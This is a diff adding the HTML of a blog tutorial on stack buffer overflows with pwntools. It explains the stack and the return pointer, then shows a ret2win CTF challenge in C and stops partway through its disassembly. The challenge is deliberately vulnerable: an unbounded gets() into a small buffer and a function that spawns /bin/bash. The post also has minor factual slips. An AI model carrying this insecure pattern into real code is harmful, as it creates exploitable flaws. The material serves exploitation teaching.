@@ -1,0 +1,831 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Overview Stack based buffer overflows are old as fuck. Like I was literally dead when the most advanced techniques for exploiting them were conceived. However pwntools is a exploitation framework that has been around for a much shorter period of time and adds a new level of simplicity which makes exploit development more approachable. Of course there exist a great number of better binary exploitation courses and guides, a few of which I will link in the resources section bellow." />
+<meta name="keywords" content=", Buffer Overflows, Exploit Development, Stack Based Overflows, pwntools, pentesting, hacking" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="#252627" />
+<link rel="canonical" href="https://cybernetic.coffee/blog/basic-stack-based-overflows/" />
+
+
+    <title>
+        
+            Basic Stack Based Overflows :: Cybernetic Coffee 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.64cc374c419669695f00d5c55727fea41e0fdc86b9beb1b4d1d1bcf24284f422.css">
+
+
+
+
+<link rel="shortcut icon" href="https://cybernetic.coffee/images/favicon.ico" />
+
+
+<meta itemprop="name" content="Basic Stack Based Overflows">
+<meta itemprop="description" content="Overview Stack based buffer overflows are old as fuck. Like I was literally dead when the most advanced techniques for exploiting them were conceived. However pwntools is a exploitation framework that has been around for a much shorter period of time and adds a new level of simplicity which makes exploit development more approachable. Of course there exist a great number of better binary exploitation courses and guides, a few of which I will link in the resources section bellow."><meta itemprop="datePublished" content="2021-07-01T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2021-07-01T00:00:00+00:00" />
+<meta itemprop="wordCount" content="3517">
+<meta itemprop="keywords" content="Buffer Overflows,Exploit Development,Stack Based Overflows,pwntools,pentesting,hacking," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Basic Stack Based Overflows"/>
+<meta name="twitter:description" content="Overview Stack based buffer overflows are old as fuck. Like I was literally dead when the most advanced techniques for exploiting them were conceived. However pwntools is a exploitation framework that has been around for a much shorter period of time and adds a new level of simplicity which makes exploit development more approachable. Of course there exist a great number of better binary exploitation courses and guides, a few of which I will link in the resources section bellow."/>
+
+
+
+
+
+    <meta property="article:section" content="Hacking" />
+
+    <meta property="article:section" content="Binary Exploitation" />
+
+
+
+    <meta property="article:published_time" content="2021-07-01 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <script src="https://kit.fontawesome.com/5eb4842dc5.js" crossorigin="anonymous"></script>
+
+<a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__text">Cybernetic <i class="fas fa-mug-hot"> </i> </span>
+            <span class="logo__mark"><i class="fas fa-terminal"></i></span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#00ba68;
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://cybernetic.coffee/feed/">Activity Feed</a></li><li><a href="https://cybernetic.coffee/projects/">Projects</a></li><li><a href="https://cybernetic.coffee/blog">Blog</a></li><li><a href="https://cybernetic.coffee/ctf">CTF</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+        
+        <div class="post-info">
+            <p>
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+                    <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+                    <line x1="16" y1="2" x2="16" y2="6"></line>
+                    <line x1="8" y1="2" x2="8" y2="6"></line>
+                    <line x1="3" y1="10" x2="21" y2="10"></line>
+                </svg>
+                
+                    2021-07-01 10:00
+                
+
+                
+            </p>
+        </div>
+        
+
+        <article>
+            <h2 class="post-title"><a href="https://cybernetic.coffee/blog/basic-stack-based-overflows/">Basic Stack Based Overflows</a></h2>
+
+            
+
+            
+            <div class="post-info">
+
+                <div class="sharing-buttons">
+                    
+
+
+
+
+
+
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fcybernetic.coffee%2fblog%2fbasic-stack-based-overflows%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fcybernetic.coffee%2fblog%2fbasic-stack-based-overflows%2f&amp;resubmit=true&amp;title=Basic%20Stack%20Based%20Overflows" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fcybernetic.coffee%2fblog%2fbasic-stack-based-overflows%2f&amp;t=Basic%20Stack%20Based%20Overflows" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+
+
+
+
+
+
+
+                </div>
+            </div>
+            
+
+            <hr />
+
+            
+
+            
+
+            <div class="post-content">
+                <h2 id="overview">Overview</h2>
+<p>Stack based buffer overflows are old as fuck. Like I was literally dead when the most advanced techniques for exploiting them were conceived. However <a href="https://github.com/Gallopsled/pwntools">pwntools</a> is a exploitation framework that has been around for a much shorter period of time and adds a new level of simplicity which makes exploit development more approachable. Of course there exist a great number of <strong>better</strong> binary exploitation courses and guides, a few of which I will link in the <a href="#resources">resources</a> section bellow. However, from my experience there are far less complete guides/tutorials on modern binary exploitation which wield the full potential of pwntools and other tools. That is not to say that really good pwntools based tutorials and writeups do not exist and I will also link and specify those, the <a href="https://github.com/Gallopsled/pwntools-write-ups">pwntools</a> repo itself features a number of useful example writeups which I highly recommend.</p>
+<p>With that said lets explore some basic stack based buffer overflows with pwntools and <a href="https://github.com/pwndbg/pwndbg">pwndbg</a>, a plugin for <a href="https://www.gnu.org/software/gdb/">gdb</a>.</p>
+<h4 id="-what-is-a-buffer-overflowa-buffer-what">‣ <a href="#a-buffer-what">What is a buffer overflow?</a></h4>
+<h4 id="-ret2winret2win">‣ <a href="#ret2win">ret2win</a></h4>
+<h4 id="-ret2shellcoderet2shellcode">‣ <a href="#ret2shellcode">ret2shellcode</a></h4>
+<h4 id="-resourcesresources">‣ <a href="#resources">Resources</a></h4>
+<h2 id="a-buffer-what">A buffer what??</h2>
+<p>This will not be the best place to start learning about what a buffer overflow is but to quote my <a href="https://github.com/Angus-C-git/SecSheets/blob/master/Binary%20Exploitation/Overflows/Buffer%20Overflows/Buffer%20Overflows.md">SecSheets</a> repo.</p>
+<blockquote>
+<p>&ldquo;Buffer Overflows are a type of binary exploitation which arise from poor programing practices and memory allocation in memory managed programing languages like C. They are an example of &lsquo;mixing data and control&rsquo;.&rdquo;</p>
+</blockquote>
+<p>In this case we focus on those that overrun memory on the stack.</p>
+<h3 id="the-stack">The Stack</h3>
+<p>The stack is a region within a programs <a href="https://devsheets.cybernetic.coffee/os/virtual-memory/#address-space-layout">address space</a>, which in many operating systems have a structure similar to the following.</p>
+<pre tabindex="0"><code>Stack Bottom +------------&gt; +---------------------------------------------------+        +
+                            |                                                   |        |
+                            |                                                   |        |
+                            |                                                   |        |
+                            |                   Stack Region                    |        |
+                            |                                                   |        |
+                            |                                                   |        |     Lower Memory Addresses
+                            +------------------------+--------------------------+        |
+                            |                        |                          |        |
+                            |                        |                          |        |
+                            |                        |                          |        |
+                            |                        |                          |        |
+                            |                        |                          |        |
+                            |                        |                          |        |
+                            |                        v                          |        v
+Stack Top    +-----------&gt;  +---------------------------------------------------+
+                            |                                                   |
+                            |                                                   |
+                            |                  Shared Libraries                 |
+                            |                                                   |
+                            |                                                   |
+                            +---------------------------------------------------+        ^
+                            |                        ^                          |        |
+                            |                        |                          |        |
+                            |                        |                          |        |
+                            |                        |                          |        |
+                            |                        |                          |        |
+                            |                        |                          |        |
+                            |                        |                          |        |
+                            |                        |                          |        |
+                            +------------------------+--------------------------+        |     Higher Memory Addresses
+                            |                                                   |        |
+                            |                                                   |        |
+                            |                   Heap Region                     |        |
+                            |                                                   |        |
+                            |                                                   |        |
+                            +---------------------------------------------------+        +
+                            |                                                   |
+                            |                      Data                         |
+                            |                                                   |
+                            +---------------------------------------------------+
+                            |                                                   |
+                            |                                                   |
+                            |                                                   |
+                            |                                                   |
+                            |                      Text                         |
+                            |                                                   |
+                            |                                                   |
+                            |                                                   |
+                            |                                                   |
+                            +---------------------------------------------------+
+</code></pre><ul>
+<li>For all intensive purposes we will think about the stack growing <strong>down</strong> towards <strong>lower memory</strong> addresses.</li>
+</ul>
+<h3 id="a-buffer">A Buffer</h3>
+<p>A buffer is simply a fixed size data structure into which data is stored. In the case of buffer overflows we only really care about buffers that we can control the data to. In the real world identifying these buffers is far from a linear process with massive codebases and many paths through the code. However here we will only explore small binaries which mimic just small segments of larger programs.</p>
+<p>If the function which which reads client/user supplied data into a buffer is unguarded or improperly guarded, meaning it reads in more data then the buffer can hold, it is likely possible to overwrite the return pointer on the stack, a special value which controls the order of code execution, to archive near arbitrary code execution.</p>
+<h3 id="the-return-pointer">The Return Pointer</h3>
+<p>When you write a function in C program it will typically have a structure similar to the following.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">function</span>() 
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>When this is compiled by <code>gcc</code> or similar C compilers as a 32 bit binary the <code>return 0;</code> will be converted to a <code>ret</code> x86 instruction of some kind (either <code>ret</code>, <code>retn</code>, <code>retf</code>). The <code>ret</code> instruction is actually a simplification of several instructions responsible for redirecting code execution back to the segment of the program that called the function, or in the case of the main function the end segment. Thus the above C code will have the following x86 decompilation.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span>function:
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">endbr32</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">push</span> ebp
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> ebp, esp
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add</span> esp, <span style="color:#ae81ff">0x2e23</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">0x1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pop</span> ebp
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">retn</span>                <span style="color:#75715e">; return to calling function</span>
+</span></span></code></pre></div><p>If we can overflow a buffer to this <code>retn</code> we can tell the program to return to anywhere in valid memory for the program. We will soon see some useful places to return but for now just know that control of this return pointer is central to stack buffer overflows.</p>
+<h3 id="important-x86-registers">Important x86 Registers</h3>
+<p>The letters you see in the x86 assembly above, namely
++ <code>ebp</code>
++ <code>esp</code>
++ <code>eax</code>
+are all x86 registers. You can think of them as variables for simplicity. Some of these registers have special meaning conventionally, that is they are <strong>normally</strong> used for these reasons.</p>
+<ul>
+<li><strong>eax:</strong> Conventionally (compiler based) stores the address of the return from a function call</li>
+<li><strong>esp:</strong> Extended Stack Pointer, points to the most recent data on the stack</li>
+<li><strong>ebp:</strong> Extended Base Pointer, points to the bottom of the stack region</li>
+<li><strong>eip:</strong> Extended Instruction Pointer, points to the current instruction to be executed in the program</li>
+</ul>
+<h2 id="ret2win">ret2win</h2>
+<p>ret2win short for return to win is a fun category of stack based buffer overflow challenges which are an excellent place to start learning <a href="https://en.wikipedia.org/wiki/Buffer_overflow">buffer overflows</a>.</p>
+<p>The name characterizes the technique of controlling the return pointer of a function, via a buffer overflow, to jump to a <code>win()</code> function somewhere else in the binary. This function will typically grant the attacker a shell or leak the flag/file directly.</p>
+<p>Although &lsquo;win&rsquo; functions, functions that do something desireable for the attacker, do exist in real programs they are far more common in CTF challenges like the one we will walk through.</p>
+<h3 id="a-typical-ret2win-challenge">A Typical ret2win challenge</h3>
+<p>To begin with lets take a look at a very simple buffer overflow challenge with the following C source code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">win</span>(<span style="color:#66d9ef">void</span>) 
+</span></span><span style="display:flex;"><span>{ 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/bash&#34;</span>); 
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">vuln</span>() 
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">42</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setbuf</span>(stdout, NULL);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Here we goooooooooo...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">gets</span>(buf);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv) 
+</span></span><span style="display:flex;"><span>{ 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">vuln</span>(); 
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>If we open this binary in a decompiler like the excellent <a href="https://binary.ninja/">binaryninja</a> or more famous <a href="https://hex-rays.com/IDA-free/">IDA</a>, we would be able to view the x86 instructions that make up this program. Since this binary is very small and simple I will not get into <a href="https://github.com/Angus-C-git/SecSheets/blob/master/Binary%20Exploitation/Reversing/Reversing.md#reversing">reverse engineering</a> here and will instead make a separate blog on reversing. Thus for now we will use <a href="https://github.com/Angus-C-git/SecSheets/blob/master/Binary%20Exploitation/Tooling/Tooling.md#debuggers">pwndbgs</a> <code>disassemble</code>  function to view the assembly instructions.</p>
+<p>Simply run <code>gdb ./programs_name</code> to launch pwndbg and then we can disassemble the programs functions.</p>
+<p><strong><code>&gt;_ disassemble main</code></strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049278</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>:	    endbr32 
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804927c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>:	    push   ebp
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804927d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">5</span><span style="color:#f92672">&gt;</span>:	    mov    ebp,esp
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804927f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">7</span><span style="color:#f92672">&gt;</span>:	    and    esp,<span style="color:#ae81ff">0xfffffff0</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049282</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">10</span><span style="color:#f92672">&gt;</span>:	    call   <span style="color:#ae81ff">0x8049298</span> <span style="color:#f92672">&lt;</span>__x86.get_pc_thunk.ax<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049287</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">15</span><span style="color:#f92672">&gt;</span>:	    add    eax,<span style="color:#ae81ff">0x206d</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804928c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">20</span><span style="color:#f92672">&gt;</span>:	    call   <span style="color:#ae81ff">0x8049225</span> <span style="color:#f92672">&lt;</span>vuln<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049291</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">25</span><span style="color:#f92672">&gt;</span>:	    mov    eax,<span style="color:#ae81ff">0x0</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049296</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">30</span><span style="color:#f92672">&gt;</span>:	    leave  
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049297</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">31</span><span style="color:#f92672">&gt;</span>:	    ret
+</span></span></code></pre></div><p><strong>Aside:</strong> pwndbg is a python plugin/wrapper for gdb with enhanced features.</p>
+<p><strong><code>&gt;_ disassemble vuln</code></strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049225</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>:	    endbr32 
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049229</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>:	    push   ebp
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804922a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">5</span><span style="color:#f92672">&gt;</span>:	    mov    ebp,esp
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804922c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">7</span><span style="color:#f92672">&gt;</span>:	    push   ebx
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804922d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span>:	    sub    esp,<span style="color:#ae81ff">0x34</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049230</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">&gt;</span>:	    call   <span style="color:#ae81ff">0x8049130</span> <span style="color:#f92672">&lt;</span>__x86.get_pc_thunk.bx<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049235</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">16</span><span style="color:#f92672">&gt;</span>:	    add    ebx,<span style="color:#ae81ff">0x20bf</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804923b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">22</span><span style="color:#f92672">&gt;</span>:	    mov    eax,<span style="color:#66d9ef">DWORD</span> PTR [ebx<span style="color:#f92672">-</span><span style="color:#ae81ff">0x4</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049241</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">28</span><span style="color:#f92672">&gt;</span>:	    mov    eax,<span style="color:#66d9ef">DWORD</span> PTR [eax]
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049243</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">30</span><span style="color:#f92672">&gt;</span>:	    sub    esp,<span style="color:#ae81ff">0x8</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049246</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">33</span><span style="color:#f92672">&gt;</span>:	    push   <span style="color:#ae81ff">0x0</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049248</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">35</span><span style="color:#f92672">&gt;</span>:	    push   eax
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049249</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">36</span><span style="color:#f92672">&gt;</span>:	    call   <span style="color:#ae81ff">0x8049090</span> <span style="color:#f92672">&lt;</span>setbuf@plt<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804924e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">41</span><span style="color:#f92672">&gt;</span>:	    add    esp,<span style="color:#ae81ff">0x10</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049251</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">44</span><span style="color:#f92672">&gt;</span>:	    sub    esp,<span style="color:#ae81ff">0xc</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049254</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">47</span><span style="color:#f92672">&gt;</span>:	    lea    eax,[ebx<span style="color:#f92672">-</span><span style="color:#ae81ff">0x12e2</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804925a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">53</span><span style="color:#f92672">&gt;</span>:	    push   eax
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804925b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">54</span><span style="color:#f92672">&gt;</span>:	    call   <span style="color:#ae81ff">0x80490b0</span> <span style="color:#f92672">&lt;</span>puts@plt<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049260</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">59</span><span style="color:#f92672">&gt;</span>:	    add    esp,<span style="color:#ae81ff">0x10</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049263</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">62</span><span style="color:#f92672">&gt;</span>:	    sub    esp,<span style="color:#ae81ff">0xc</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049266</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">65</span><span style="color:#f92672">&gt;</span>:	    lea    eax,[ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x32</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049269</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">68</span><span style="color:#f92672">&gt;</span>:	    push   eax
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804926a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">69</span><span style="color:#f92672">&gt;</span>:	    call   <span style="color:#ae81ff">0x80490a0</span> <span style="color:#f92672">&lt;</span>gets@plt<span style="color:#f92672">&gt;</span>         <span style="color:#75715e">; dAnGeR &lt;---------- </span>
